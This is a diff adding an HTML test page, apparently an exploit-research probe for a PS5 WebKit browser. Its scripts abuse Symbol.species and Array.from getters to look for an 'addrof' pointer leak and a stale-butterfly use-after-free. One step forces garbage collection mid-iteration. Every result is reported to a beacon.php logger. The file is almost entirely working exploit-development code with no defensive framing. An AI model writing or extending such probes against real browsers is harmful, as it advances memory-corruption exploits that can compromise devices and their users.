@@ -1,0 +1,495 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>P1258</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#111;color:#0f0;font:11px/1.4 monospace;padding:8px;overflow-y:auto}
+#log{white-space:pre-wrap;word-break:break-all}
+</style>
+</head>
+<body>
+<div id="log"></div>
+
+<script>
+var L=document.getElementById('log');
+function log(s){L.textContent+=s+'\n';}
+function B(tag,data){
+  try{
+    var u='/beacon.php?tag=P1258-'+encodeURIComponent(tag);
+    if(data)u+='&data='+encodeURIComponent(String(data).slice(0,900));
+    u+='&t='+Date.now();
+    var x=new XMLHttpRequest();x.open('GET',u,false);x.send(null);
+  }catch(e){}
+}
+log('=== P1258: SPECIES ADDROF + STALE BUTTERFLY ===');
+B('START','P1258');
+</script>
+
+<!-- A: Species returning Float64Array — does map store raw JSValues or coerced numbers? -->
+<script>
+log('\n--- A: Species → Float64Array ---');
+(function(){
+  // Test 1: map simple numbers into Float64Array via species
+  var arr=[1.1, 2.2, 3.3, 4.4, 5.5];
+  arr.constructor={};
+  arr.constructor[Symbol.species]=function(len){
+    return new Float64Array(len);
+  };
+  try{
+    var result=arr.map(function(x){return x;});
+    var isTA=(result instanceof Float64Array);
+    B('A1','isTA='+isTA+'|len='+result.length+
+      '|v0='+result[0]+'|v1='+result[1]+'|v4='+result[4]+
+      '|type='+typeof result[0]+'|ctor='+result.constructor.name);
+  }catch(e){B('A1','err:'+e.name+':'+e.message.slice(0,80));}
+
+  // Test 2: map objects into Float64Array — what do we get?
+  var obj1={valueOf:function(){return 42;}};
+  var obj2={toString:function(){return "99";}};
+  var obj3=document.createElement('div');
+  var arr2=[obj1, obj2, obj3, null, undefined];
+  arr2.constructor={};
+  arr2.constructor[Symbol.species]=function(len){
+    return new Float64Array(len);
+  };
+  try{
+    var result2=arr2.map(function(x){return x;});
+    B('A2','isTA='+(result2 instanceof Float64Array)+
+      '|v0='+result2[0]+'|v1='+result2[1]+'|v2='+result2[2]+
+      '|v3='+result2[3]+'|v4='+result2[4]);
+  }catch(e){B('A2','err:'+e.name+':'+e.message.slice(0,80));}
+
+  // Test 3: map objects, read via BigUint64Array on same buffer
+  var buf=new ArrayBuffer(40);
+  var f64=new Float64Array(buf);
+  var u64=new BigUint64Array(buf);
+  // Fill with sentinels
+  for(var i=0;i<u64.length;i++) u64[i]=0xDEADDEADDEADDEADn;
+
+  var arr3=[1.1, 2.2, 3.3, 4.4, 5.5];
+  arr3.constructor={};
+  arr3.constructor[Symbol.species]=function(len){
+    return f64; // Return pre-existing Float64Array with shared buffer
+  };
+  try{
+    var result3=arr3.map(function(x){return x;});
+    // Read the raw bits via BigUint64Array
+    var bits=[];
+    for(var i=0;i<u64.length;i++){
+      bits.push('0x'+u64[i].toString(16));
+    }
+    B('A3','isSame='+(result3===f64)+
+      '|bits='+bits.join(';'));
+  }catch(e){B('A3','err:'+e.name+':'+e.message.slice(0,80));}
+})();
+</script>
+
+<!-- B: Species returning plain object, map writing OBJECTS (not numbers) -->
+<script>
+log('\n--- B: Species plain obj with object values ---');
+(function(){
+  var target={secret:42};
+  var arr=[target, target, target];
+  arr.constructor={};
+  arr.constructor[Symbol.species]=function(len){
+    return {}; // Plain object
+  };
+  try{
+    var result=arr.map(function(x){return x;});
+    // result[0] should be the target object itself
+    B('B1','v0_type='+typeof result[0]+
+      '|is_target='+(result[0]===target)+
+      '|secret='+result[0].secret+
+      '|len='+result.length);
+  }catch(e){B('B1','err:'+e.name+':'+e.message.slice(0,80));}
+
+  // Now: species returns object, map writes objects, can we observe JSValue bits?
+  // Idea: use defineProperty with get/set on a TypedArray index to intercept
+  var buf=new ArrayBuffer(24);
+  var u64=new BigUint64Array(buf);
+  for(var i=0;i<u64.length;i++) u64[i]=0xAAAAAAAAAAAAAAAAn;
+
+  var obj={};
+  // Manually map indices to write into our buffer
+  // When map writes obj[0]=target, can we catch the raw bits?
+  var arr2=[target];
+  arr2.constructor={};
+  arr2.constructor[Symbol.species]=function(len){
+    // Return the BigUint64Array itself — map will write to it
+    return u64;
+  };
+  try{
+    var result2=arr2.map(function(x){return x;});
+    B('B2','isBig='+(result2 instanceof BigUint64Array)+
+      '|v0=0x'+u64[0].toString(16)+
+      '|v1=0x'+u64[1].toString(16)+
+      '|v2=0x'+u64[2].toString(16)+
+      '|changed0='+(u64[0]!==0xAAAAAAAAAAAAAAAAn));
+  }catch(e){B('B2','err:'+e.name+':'+e.message.slice(0,80));}
+})();
+</script>
+
+<!-- C: Species returning Uint8Array — test type coercion path -->
+<script>
+log('\n--- C: Species → Uint8Array ---');
+(function(){
+  var arr=[0x41, 0x42, 0x43, 0x44];
+  arr.constructor={};
+  arr.constructor[Symbol.species]=function(len){
+    return new Uint8Array(len);
+  };
+  try{
+    var result=arr.map(function(x){return x;});
+    var isU8=(result instanceof Uint8Array);
+    var bytes=[];
+    for(var i=0;i<result.length;i++) bytes.push(result[i]);
+    B('C1','isU8='+isU8+'|bytes='+bytes.join(',')+'|len='+result.length);
+  }catch(e){B('C1','err:'+e.name+':'+e.message.slice(0,80));}
+
+  // Species returns Uint8Array, map writes object — what bits appear?
+  var target={x:1};
+  var arr2=[target, null, 'hello', true];
+  arr2.constructor={};
+  arr2.constructor[Symbol.species]=function(len){
+    var u=new Uint8Array(len);
+    for(var i=0;i<len;i++) u[i]=0xFF;
+    return u;
+  };
+  try{
+    var result2=arr2.map(function(x){return x;});
+    var bytes2=[];
+    for(var i=0;i<result2.length;i++) bytes2.push(result2[i]);
+    B('C2','isU8='+(result2 instanceof Uint8Array)+
+      '|bytes='+bytes2.join(','));
+  }catch(e){B('C2','err:'+e.name+':'+e.message.slice(0,80));}
+})();
+</script>
+
+<!-- D: Species returning DataView-backed proxy trap -->
+<script>
+log('\n--- D: Hybrid species-dataview ---');
+(function(){
+  // What if species returns an object whose [[Set]] is overridden at C++ level?
+  // ArrayBuffer + DataView don't have indexed [[Set]]...
+  // But what about a plain object with a backing buffer?
+
+  var buf=new ArrayBuffer(64);
+  var dv=new DataView(buf);
+  var u64=new BigUint64Array(buf);
+  for(var i=0;i<u64.length;i++) u64[i]=0xBBBBBBBBBBBBBBBBn;
+
+  // Species returns plain object — map writes via [[CreateDataProperty]]
+  // Then we check if any writes leaked into the underlying buffer
+  var target={marker:0xCAFE};
+  var arr=[target, target, target, target, target, target, target, target];
+  arr.constructor={};
+  arr.constructor[Symbol.species]=function(len){
+    // Plain object, not TypedArray — map uses generic property write
+    return {length:len};
+  };
+  try{
+    var result=arr.map(function(x){return x;});
+    // result is {0:target, 1:target, ..., length:8}
+    // Can we trick JSC into thinking this object's storage overlaps our buffer?
+    // No — the plain object has its own butterfly/property storage.
+    B('D1','type='+typeof result[0]+'|is_target='+(result[0]===target)+
+      '|buf_changed='+(u64[0]!==0xBBBBBBBBBBBBBBBBn));
+  }catch(e){B('D1','err:'+e.name+':'+e.message.slice(0,80));}
+
+  // Key test: species returning Float64Array with shared ArrayBuffer
+  // If map writes the raw JSValue (tagged pointer) as if writing to a plain object,
+  // but the storage is actually the Float64Array's buffer, we get addrof!
+  var buf2=new ArrayBuffer(64);
+  var f64=new Float64Array(buf2);
+  var bi64=new BigInt64Array(buf2);
+  for(var i=0;i<bi64.length;i++) bi64[i]=0x4141414141414141n;
+
+  var arr2=[target];
+  arr2.constructor={};
+  arr2.constructor[Symbol.species]=function(len){
+    return f64;
+  };
+  try{
+    var result2=arr2.map(function(x){return x;});
+    // Check if the buffer has the raw JSValue of target
+    var rawBits=[];
+    for(var i=0;i<bi64.length;i++){
+      if(bi64[i]!==0x4141414141414141n){
+        rawBits.push(i+':0x'+bi64[i].toString(16));
+      }
+    }
+    B('D2','changed='+rawBits.length+'|bits='+rawBits.join(';')+
+      '|f64_0='+f64[0]+'|f64_isNaN='+isNaN(f64[0]));
+  }catch(e){B('D2','err:'+e.name+':'+e.message.slice(0,80));}
+})();
+</script>
+
+<!-- E: Array.from stale-length + butterfly free attempt -->
+<script>
+log('\n--- E: Array.from stale butterfly ---');
+(function(){
+  // Create array with 20 double elements (forces butterfly allocation)
+  var arr=new Array(20);
+  for(var i=0;i<20;i++) arr[i]=i+0.1;
+
+  // At index 3, free the butterfly by replacing all elements with named properties
+  Object.defineProperty(arr, "3", {
+    get:function(){
+      // Try to force butterfly reallocation:
+      // 1. Delete all indexed elements
+      for(var i=4;i<20;i++) delete arr[i];
+      // 2. Force transition to dictionary mode by adding many non-integer keys
+      for(var i=0;i<500;i++) arr['key'+i]='val'+i;
+      // 3. Force GC
+      for(var g=0;g<3;g++){
+        var garbage=[];
+        for(var j=0;j<5000;j++) garbage.push({a:j,b:new ArrayBuffer(64)});
+      }
+      return 3.3;
+    },
+    configurable:true, enumerable:true
+  });
+
+  try{
+    var result=Array.from(arr);
+    // Check if any values are unexpected (from freed/reallocated memory)
+    var vals=[];
+    for(var i=0;i<Math.min(result.length,20);i++){
+      vals.push(i+':'+result[i]);
+    }
+    B('E1','from_len='+result.length+'|vals='+vals.join(';'));
+  }catch(e){B('E1','err:'+e.name+':'+e.message.slice(0,80));}
+
+  // Test 2: Use Array.from's mapfn parameter with getter mutation
+  var arr2=new Array(16);
+  for(var i=0;i<16;i++) arr2[i]=i+0.1;
+
+  var readCount=0;
+  Object.defineProperty(arr2, "4", {
+    get:function(){
+      readCount++;
+      if(readCount===1){
+        // Replace the array's elements with a completely different set
+        arr2.length=0;
+        arr2.length=16;
+        for(var i=0;i<16;i++) arr2[i]=100+i;
+      }
+      return 4.4; // Return the "old" value
+    },
+    configurable:true, enumerable:true
+  });
+
+  try{
+    var result2=Array.from(arr2, function(x){return x;});
+    B('E2','from_len='+result2.length+
+      '|v0='+result2[0]+'|v4='+result2[4]+
+      '|v5='+result2[5]+'|v15='+result2[15]);
+  }catch(e){B('E2','err:'+e.name+':'+e.message.slice(0,80));}
+})();
+</script>
+
+<!-- F: filter/slice species with controlled write destination -->
+<script>
+log('\n--- F: filter + slice species ---');
+(function(){
+  // Does Array.prototype.filter respect species?
+  var arr=[1,2,3,4,5,6,7,8,9,10];
+  var speciesCalled=false;
+  arr.constructor={};
+  arr.constructor[Symbol.species]=function(len){
+    speciesCalled=true;
+    return new Array(len);
+  };
+  try{
+    var result=arr.filter(function(x){return x>5;});
+    B('F1','species_called='+speciesCalled+
+      '|result='+result.join(',')+
+      '|len='+result.length+'|isArr='+Array.isArray(result));
+  }catch(e){B('F1','err:'+e.name+':'+e.message.slice(0,80));}
+
+  // Does slice respect species?
+  speciesCalled=false;
+  var arr2=[10,20,30,40,50];
+  arr2.constructor={};
+  arr2.constructor[Symbol.species]=function(len){
+    speciesCalled=true;
+    return {};
+  };
+  try{
+    var result2=arr2.slice(1,4);
+    B('F2','species_called='+speciesCalled+
+      '|v0='+result2[0]+'|v1='+result2[1]+'|v2='+result2[2]+
+      '|isArr='+Array.isArray(result2)+'|type='+typeof result2);
+  }catch(e){B('F2','err:'+e.name+':'+e.message.slice(0,80));}
+
+  // Does splice respect species?
+  speciesCalled=false;
+  var arr3=[100,200,300,400,500];
+  arr3.constructor={};
+  arr3.constructor[Symbol.species]=function(len){
+    speciesCalled=true;
+    return new Float64Array(len);
+  };
+  try{
+    var result3=arr3.splice(1,3);
+    B('F3','species_called='+speciesCalled+
+      '|isTA='+(result3 instanceof Float64Array)+
+      '|v0='+result3[0]+'|v1='+result3[1]+'|v2='+result3[2]+
+      '|len='+result3.length);
+  }catch(e){B('F3','err:'+e.name+':'+e.message.slice(0,80));}
+
+  // concat species test
+  speciesCalled=false;
+  var arr4=[1,2,3];
+  arr4.constructor={};
+  arr4.constructor[Symbol.species]=function(len){
+    speciesCalled=true;
+    return new Float64Array(10);
+  };
+  try{
+    var result4=arr4.concat([4,5,6]);
+    B('F4','species_called='+speciesCalled+
+      '|isTA='+(result4 instanceof Float64Array)+
+      '|type='+(typeof result4)+'|isArr='+Array.isArray(result4)+
+      '|len='+result4.length);
+  }catch(e){B('F4','err:'+e.name+':'+e.message.slice(0,80));}
+})();
+</script>
+
+<!-- G: The critical addrof test — species→Float64Array, map object values -->
+<script>
+log('\n--- G: Critical addrof via species ---');
+(function(){
+  // THE KEY QUESTION: When map() writes an OBJECT into the species result,
+  // and the species result is a Float64Array, does it:
+  // (a) Coerce to number (ToNumber → NaN for objects) — SAFE
+  // (b) Write raw JSValue bits into the TypedArray buffer — ADDROF!
+
+  var buf=new ArrayBuffer(64);
+  var f64=new Float64Array(buf);
+  var u64=new BigUint64Array(buf);
+
+  // Fill with sentinel
+  for(var i=0;i<u64.length;i++) u64[i]=0xCAFECAFECAFECAFEn;
+
+  // Create unique objects we can identify
+  var obj1={id:'alpha'};
+  var obj2=document.createElement('span');
+  var obj3=function named(){};
+  var obj4=[1,2,3];
+  var obj5=new Map();
+  var obj6=new RegExp('test');
+  var obj7=Symbol('sym');
+  var obj8=42n; // BigInt
+
+  var arr=[obj1, obj2, obj3, obj4, obj5, obj6, 'string', true];
+  arr.constructor={};
+  arr.constructor[Symbol.species]=function(len){
+    return f64; // Return our Float64Array!
+  };
+
+  try{
+    var result=arr.map(function(x){return x;});
+
+    // Check raw bits!
+    var bits=[];
+    for(var i=0;i<8;i++){
+      var val=u64[i];
+      var changed=(val!==0xCAFECAFECAFECAFEn);
+      bits.push(i+'='+(changed?'0x'+val.toString(16):'SAME'));
+    }
+    B('G1','bits='+bits.join(';'));
+
+    // Also check Float64Array values
+    var fvals=[];
+    for(var i=0;i<8;i++){
+      fvals.push(i+':'+f64[i]+(isNaN(f64[i])?'(NaN)':''));
+    }
+    B('G2','fvals='+fvals.join(';'));
+
+    // Check if any values look like heap pointers (PS5 WebKit heap ~0x30xxxxxxxxx)
+    var ptrs=[];
+    for(var i=0;i<8;i++){
+      var hi=Number(u64[i]>>32n);
+      if(hi>0x100 && hi<0xFFFF0000){
+        ptrs.push(i+':0x'+u64[i].toString(16));
+      }
+    }
+    B('G3','potential_ptrs='+ptrs.length+'|data='+ptrs.join(';'));
+
+  }catch(e){B('G1','err:'+e.name+':'+e.message.slice(0,80));}
+
+  // Test with explicit object-to-number coercion check
+  try{
+    var buf2=new ArrayBuffer(16);
+    var f64_2=new Float64Array(buf2);
+    var u64_2=new BigUint64Array(buf2);
+    u64_2[0]=0xDDDDDDDDDDDDDDDDn;
+    u64_2[1]=0xDDDDDDDDDDDDDDDDn;
+
+    var unique={valueOf:function(){return 123.456;}};
+    var arr2=[unique, {no_valueOf:true}];
+    arr2.constructor={};
+    arr2.constructor[Symbol.species]=function(len){ return f64_2; };
+
+    arr2.map(function(x){return x;});
+    B('G4','v0=0x'+u64_2[0].toString(16)+
+      '|v1=0x'+u64_2[1].toString(16)+
+      '|f0='+f64_2[0]+'|f1='+f64_2[1]);
+  }catch(e){B('G4','err:'+e.name+':'+e.message.slice(0,80));}
+})();
+</script>
+
+<!-- H: Bonus — test if flatMap/flat respect species -->
+<script>
+log('\n--- H: flatMap/flat species ---');
+(function(){
+  var speciesCalls=[];
+
+  if(typeof Array.prototype.flatMap==='function'){
+    var arr=[1,2,3];
+    arr.constructor={};
+    arr.constructor[Symbol.species]=function(len){
+      speciesCalls.push('flatMap:'+len);
+      return new Array(len);
+    };
+    try{
+      var result=arr.flatMap(function(x){return [x,x*10];});
+      B('H1','flatMap_species='+speciesCalls.join(';')+
+        '|result='+result.join(',')+
+        '|len='+result.length);
+    }catch(e){B('H1','err:'+e.name+':'+e.message.slice(0,80));}
+  }else{
+    B('H1','no_flatMap');
+  }
+
+  // Test: can we observe raw bits through any combo?
+  // species→SharedArrayBuffer? (probably no SAB on PS5)
+  try{
+    var sab=new SharedArrayBuffer(64);
+    B('H2','SAB=yes');
+  }catch(e){
+    B('H2','SAB=no:'+e.name);
+  }
+
+  // Test: Atomics availability
+  try{
+    B('H3','Atomics='+(typeof Atomics));
+  }catch(e){
+    B('H3','Atomics_err:'+e.name);
+  }
+})();
+</script>
+
+<script>
+setTimeout(function(){
+  B('DONE','all');
+  log('\n=== P1258 COMPLETE ===');
+}, 5000);
+</script>
+
+</body>
+</html>
